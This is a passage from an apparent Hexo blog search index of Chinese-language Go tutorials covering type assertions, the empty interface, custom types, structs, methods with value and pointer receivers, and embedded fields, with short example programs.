punctuation">,</span> iface<span class="token punctuation">,</span> iface<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//main.st2 {s2}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h5 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h5><ul><li><p>类型断言即断言当前接口存储的值的类型。</p><blockquote><ul><li>x.(T)       //断言<code>x</code>接口变量存储（指向）的值的类型为<code>T</code>。</li></ul></blockquote><ul><li><p>会返回两个参数：</p><ul><li>若断言成功返回的第一个参数是<code>x</code>接口变量指向的类型的值。</li><li>第二个值是一个布尔值，若为<code>true</code>则表示断言成功，为false则表示断言失败。</li></ul><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> x <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//空接口可以接收任意类型的值。</span>i <span class="token operator">:=</span> <span class="token number">1</span>x <span class="token operator">=</span> i  <span class="token comment" spellcheck="true">//此时x接口变量指向int类型的数据。</span>v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> x<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//断言，第一个参数接收值，第二个参数是判断是否为int的断言结果</span><span class="token keyword">if</span> ok <span class="token punctuation">{</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//1</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p>若断言的类型是值类型，则返回的值是拷贝。断言引用类型返回的是引用。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    array1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>    slc <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//断言值类型</span>    a <span class="token operator">=</span> array1    v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> a<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ok <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2 3]</span>        array1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2 3]。值未改变，因此值类型断言返回的值是拷贝。</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//断言引用类型</span>    a <span class="token operator">=</span> slc    v1<span class="token punctuation">,</span> ok <span class="token operator">:=</span> a<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ok <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[4 5 6]</span>        slc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[111 5 6]。值发生了改变，因此引用类型断言返回的是引用。</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="四、空接口（interface-）"><a href="#四、空接口（interface-）" class="headerlink" title="四、空接口（interface{}）"></a>四、空接口（interface{}）</h2><blockquote><p><strong>空接口是没有定义任何方法的接口，因此所有类型都实现了空接口，因此空接口类型的变量可以接收存储任意类型的变量。</strong></p></blockquote><ul><li><strong>空接口的主要应用：</strong><ul><li>使用空接口作为函数形参，可以实现接收任意类型参数。     <code>func test(a interface{}){}</code></li><li>使用空接口作为map的值的类型，可以实现map的值为任意类型。  <code>x := make( map[int]interface{} )</code></li><li>空接口类型的chan可以实现传输任意类型数据。       <code>ch := make(chan interface{})</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—结构体</title>
      <link href="2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E7%BB%93%E6%9E%84%E4%BD%93/"/>
      <url>2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E7%BB%93%E6%9E%84%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、自定义类型与类型别名"><a href="#一、自定义类型与类型别名" class="headerlink" title="一、自定义类型与类型别名"></a>一、自定义类型与类型别名</h2><ul><li><p>类型别名在编译时会被替换为原类型。</p></li><li><p>自定义类型在编译时会保留。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">type</span> newInt <span class="token builtin">int</span>  <span class="token comment" spellcheck="true">//自定义类型，新的类型</span>    <span class="token keyword">type</span> myInt <span class="token operator">=</span> <span class="token builtin">int</span> <span class="token comment" spellcheck="true">//类型别名</span>    <span class="token keyword">var</span> m newInt <span class="token operator">=</span> <span class="token number">100</span>    <span class="token keyword">var</span> n myInt <span class="token operator">=</span> <span class="token number">100</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//main.newInt</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//int</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="二、结构体（Struct）"><a href="#二、结构体（Struct）" class="headerlink" title="二、结构体（Struct）"></a>二、结构体（Struct）</h2><ul><li>Go语言的结构体与其他语言的类有同样地位，但是Go的结构体没有继承等面向对象特性。</li><li>结构体是一块连续的地址空间，封装一个或多个基本数据类型，实现复合类型。</li><li>结构体是一种自定义数据类型，特别：<strong>每个结构体都是一种自定义的类型</strong>。</li><li>结构体是<strong>值类型</strong>。</li></ul><h5 id="0x00-结构体定义与实例化"><a href="#0x00-结构体定义与实例化" class="headerlink" title="0x00 结构体定义与实例化"></a>0x00 结构体定义与实例化</h5><ul><li><p><strong>结构体的定义只是内存布局的描述，只有当实例化结构体或初始化结构体时，才真正分配内存。</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//语法格式</span><span class="token keyword">type</span> 结构体名 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    字段名<span class="token number">1</span> 类型    字段名<span class="token number">2</span> 类型    字段名<span class="token number">3</span> 类型<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//例子</span><span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name  <span class="token builtin">string</span>    age   <span class="token builtin">int</span>    hobby <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>实例化结构体</strong></p><ul><li><p>其一：使用<code>var</code>关键字，会自动用0值进行初始化。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> aqua Personfmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> aqua<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//{  0 []}</span></code></pre></li><li><p>其二：使用<code>new</code>函数，返回结构体指针。</p><pre class=" language-go"><code class="language-go">aqua <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>Person<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> aqua<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//&amp;{ 0 []}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>aqua<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//{ 0 []}</span></code></pre></li><li><p>其三：在 Go语言中，对结构体进行<code>&amp;</code>取地址操作时，视为对该类型进行一次 <code>new</code> 的实例化操作。</p><pre class=" language-go"><code class="language-go">aqua <span class="token operator">:=</span> <span class="token operator">&amp;</span>Person<span class="token punctuation">{</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> aqua<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//&amp;{ 0 []}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>aqua<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{ 0 []}</span></code></pre></li><li><p>结构体构造函数：约定成俗以 <code>new+结构体名</code> 为构造函数名。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name <span class="token builtin">string</span>    age  <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 尽量返回指针而不是结构体本身以减少拷贝（结构体是值类型）节约内存资源。</span><span class="token keyword">func</span> <span class="token function">newPerson</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> age <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>Person <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>Person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span> name<span class="token punctuation">,</span>        age<span class="token punctuation">:</span>  age<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p1 <span class="token operator">:=</span> <span class="token function">newPerson</span><span class="token punctuation">(</span><span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span>    p2 <span class="token operator">:=</span> <span class="token function">newPerson</span><span class="token punctuation">(</span><span class="token string">"Aqua"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{Mikasa 17}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{Aqua 1000}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><strong>结构体属性初始化</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//第一种</span><span class="token keyword">var</span> p1 Personp1<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"Yuigahama"</span>p1<span class="token punctuation">.</span>Age <span class="token operator">=</span> <span class="token number">17</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p1<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p1<span class="token punctuation">.</span>Age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{Yuigahama 17} Yuigahama 17</span><span class="token comment" spellcheck="true">//第二种：声明并初始化</span>p2 <span class="token operator">:=</span> Person<span class="token punctuation">{</span>    Name<span class="token punctuation">:</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span>    Age<span class="token punctuation">:</span>  <span class="token number">16</span><span class="token punctuation">,</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> p2<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p2<span class="token punctuation">.</span>Age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{Mikasa 16} Mikasa 16</span><span class="token comment" spellcheck="true">//第三种：new</span>p3 <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>Person<span class="token punctuation">)</span>p3<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"Tosaki"</span>p3<span class="token punctuation">.</span>Age <span class="token operator">=</span> <span class="token number">18</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> p3<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p3<span class="token punctuation">.</span>Age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{Tosaki 18} Tosaki 18</span><span class="token comment" spellcheck="true">// 第四种</span>p4 <span class="token operator">:=</span> <span class="token operator">&amp;</span>Person<span class="token punctuation">{</span>    <span class="token string">"Toka"</span><span class="token punctuation">,</span>    <span class="token number">17</span><span class="token punctuation">,</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> p4<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p4<span class="token punctuation">.</span>Age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{Toka 17} Toka 17</span></code></pre></li></ul><h5 id="0x01-匿名结构体"><a href="#0x01-匿名结构体" class="headerlink" title="0x01 匿名结构体"></a>0x01 匿名结构体</h5><ul><li><p>匿名结构体常用于结构体只需要单实例时。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    waife <span class="token operator">:=</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>        name <span class="token builtin">string</span>        age  <span class="token builtin">int</span>    <span class="token punctuation">}</span><span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">"Tosaki"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span>  <span class="token number">17</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> waife<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{Tosaki 17}</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> waife <span class="token keyword">struct</span> <span class="token punctuation">{</span>        name <span class="token builtin">string</span>        age  <span class="token builtin">int</span>    <span class="token punctuation">}</span>    waife<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Yuigahama"</span>    waife<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">17</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> waife<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{Yuigahama 17}</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x02-结构体是值类型"><a href="#0x02-结构体是值类型" class="headerlink" title="0x02 结构体是值类型"></a>0x02 结构体是值类型</h5><ul><li><p>结构体是值类型，因此作为函数参数传入时，传入的是拷贝。</p></li><li><p>结构体指针访问成员变量时可以直接使用 <code>.</code>运算符 。这是因为 Go语言为了方便开发者访问结构体指针的成员变量，使用了语法糖（Syntactic sugar）技术，自动将 <code>p.name</code> 形式转换为 <code>(*p).name</code>。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name<span class="token punctuation">,</span> gender <span class="token builtin">string</span>    age          <span class="token builtin">int</span>    flag         <span class="token builtin">bool</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">change1</span><span class="token punctuation">(</span>p Person<span class="token punctuation">)</span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">change2</span><span class="token punctuation">(</span>p <span class="token operator">*</span>Person<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// (*p).flag = true</span>    p<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">true</span>  <span class="token comment" spellcheck="true">//go自动实现语法糖（*p）</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> p1 Person    p1<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">false</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{    0 false}</span>                    <span class="token function">change1</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>       fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span>flag<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>    <span class="token function">change2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p1<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">.</span>flag<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x03-结构体方法与接收器"><a href="#0x03-结构体方法与接收器" class="headerlink" title="0x03 结构体方法与接收器"></a>0x03 结构体方法与接收器</h5><ul><li><p>Go方法是作用在接收器的一个函数，而接收器是某种类型。</p></li><li><p>接收器可以是几乎任意类型（接收器不能是接口类型），即几乎任意类型都可拥有方法。</p></li><li><p>方法的作用对象是接收器，而函数没有作用对象。</p></li><li><p>为接收器定义一个方法可理解为其它语言中为类定义方法，GO语言的接收器即某一类型。</p></li><li><p><strong>为类型定义方法</strong></p><ul><li><p>接收器名类似于python的self，php的$this，谁调用了方法就指向哪个实例。但官方建议使用接收器类型名的第一个小写字母作为接收器名，而不是self、this。</p><blockquote><p>func (接收器名 接收器类型) 方法名(参数列表) (返回参数) {</p><p>​        函数体</p><p>}</p></blockquote></li></ul></li><li><p><strong>值接收器与指针接收器</strong></p><ul><li><p>值接收器的接收器名变量是调用方法实例的拷贝。</p></li><li><p>指针接收器的接收器名变量是指向调用方法实例的指针。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name <span class="token builtin">string</span>    age  <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 值接收者，p是调用该方法的实例的拷贝</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p Person<span class="token punctuation">)</span> <span class="token function">birthday1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span>age<span class="token operator">++</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 指针接收者，p是指向调用该方法的实例的指针。</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>Person<span class="token punctuation">)</span> <span class="token function">birthday2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span>age<span class="token operator">++</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p1 <span class="token operator">:=</span> Person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span>  <span class="token number">17</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    p1<span class="token punctuation">.</span><span class="token function">birthday1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//17。值接收器修改不生效，因为修改的是拷贝。</span>    p1<span class="token punctuation">.</span><span class="token function">birthday2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//18。指针接收器修改生效。</span><span class="token punctuation">}</span></code></pre></li><li><p>总结</p><blockquote><ul><li>方法要修改结构体成员内容，使用指针接收者。</li><li>方法不涉及修改结构体成员内容，使用值接收者。</li></ul></blockquote></li></ul></li><li><p><strong>Go语言可以使用<code>type</code>定义出自定义类型，之后我们可以为新自定义的类型定义方法。</strong></p><blockquote><p>当我们想让某种类型增加某个功能，就可以使用type生成新的类型，然后对新的类型添加方法，就可以达到既拥有原有类型所有特性，又可以添加实现某些附加的功能。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> New_int <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token punctuation">(</span>n New_int<span class="token punctuation">)</span> <span class="token function">Is_Zero</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> test New_int <span class="token operator">=</span> <span class="token number">0</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">Is_Zero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//true</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x04-匿名字段结构体"><a href="#0x04-匿名字段结构体" class="headerlink" title="0x04 匿名字段结构体"></a>0x04 匿名字段结构体</h5><ul><li><p>使用匿名结构体要求同一种类型只能出现一次。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">type</span> Test <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token builtin">string</span>        <span class="token builtin">int</span>    <span class="token punctuation">}</span>    t <span class="token operator">:=</span> Test<span class="token punctuation">{</span>        <span class="token string">"Aqua"</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Aqua</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token builtin">int</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//14</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">type</span> address <span class="token keyword">struct</span> <span class="token punctuation">{</span>        province <span class="token builtin">string</span>        city     <span class="token builtin">string</span>    <span class="token punctuation">}</span>    <span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">{</span>        name    <span class="token builtin">string</span>        age     <span class="token builtin">int</span>        address <span class="token comment" spellcheck="true">//匿名字段</span>    <span class="token punctuation">}</span>    p1 <span class="token operator">:=</span> <span class="token operator">&amp;</span>Person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">"Aqua"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span>  <span class="token number">1000</span><span class="token punctuation">,</span>        address<span class="token punctuation">:</span> address<span class="token punctuation">{</span>             province<span class="token punctuation">:</span> <span class="token string">"GZ"</span><span class="token punctuation">,</span>             city<span class="token punctuation">:</span>     <span class="token string">"DY"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{Aqua 1000 {GZ DY}}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>address<span class="token punctuation">.</span>province<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//GZ</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>province<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//GZ。与上面等价，可以直接取，但注意同名冲突。</span><span class="token punctuation">}</span></code></pre></li><li><p>模拟实现继承</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> animal <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name  <span class="token builtin">string</span>    color <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>a <span class="token operator">*</span>animal<span class="token punctuation">)</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s move move move !!!"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> Cat <span class="token keyword">struct</span> <span class="token punctuation">{</span>    name   <span class="token builtin">string</span>    animal <span class="token comment" spellcheck="true">//匿名结构体</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    c <span class="token operator">:=</span> <span class="token operator">&amp;</span>Cat<span class="token punctuation">{</span>        name<span class="token punctuation">:</span>   <span class="token string">"feipei"</span><span class="token punctuation">,</span>        animal<span class="token punctuation">:</span> animal<span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">"feipei"</span><span class="token punctuation">,</span> color<span class="token punctuation">:</span> <span class="token string">"yellow"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&amp;{feipei {feipei yellow}}</span>    c<span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//feipei move move move !!!。继承了animal结构体的move方法。</span>                   <span class="token comment" spellcheck="true">//其实是c.animal.move()</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—基本数据类型</title>
      <link href="2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
